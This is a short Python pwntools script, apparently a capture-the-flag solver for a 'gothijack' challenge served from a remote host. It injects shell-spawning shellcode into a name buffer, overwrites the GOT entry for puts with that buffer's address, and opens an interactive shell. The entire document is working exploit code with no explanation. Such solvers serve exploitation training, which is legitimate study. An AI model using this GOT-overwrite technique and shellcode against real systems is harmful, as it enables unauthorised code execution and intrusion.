#!/usr/bin/env python2

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

f = ELF('./gothijack')

p = remote('isc.taiwan-te.ch', 10003)

p.sendlineafter("What's you name?\n", asm(shellcraft.sh()))
p.sendlineafter("Where do you want to write?\n", str(f.got['puts']))
p.sendlineafter("Data:", p64(f.symbols['name']))

p.interactive()
p.close()

